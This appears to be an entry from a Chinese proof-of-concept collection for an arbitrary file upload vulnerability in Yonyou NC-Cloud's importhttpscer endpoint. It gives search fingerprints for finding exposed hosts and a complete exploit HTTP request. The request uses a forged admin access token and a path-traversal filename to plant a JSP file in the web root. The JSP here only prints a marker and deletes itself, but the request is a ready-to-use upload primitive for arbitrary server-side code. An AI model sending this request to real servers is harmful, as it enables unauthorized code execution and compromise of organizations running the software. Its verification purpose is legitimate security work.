﻿# 用友NC-Cloud importhttpscer 任意文件上传漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"

> 验证脚本：HTTP

```
POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
Content-Type: multipart/form-data; boundary=fdgbufgiugfbifureh7rgigvgbg998

--fdgbufgiugfbifureh7rgigvgbg998
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/dudesuite.jsp"

<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--fdgbufgiugfbifureh7rgigvgbg998--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesuite.jsp

> 验证文件来源：用友NC-Cloud importhttpscer 任意文件上传漏洞.poc

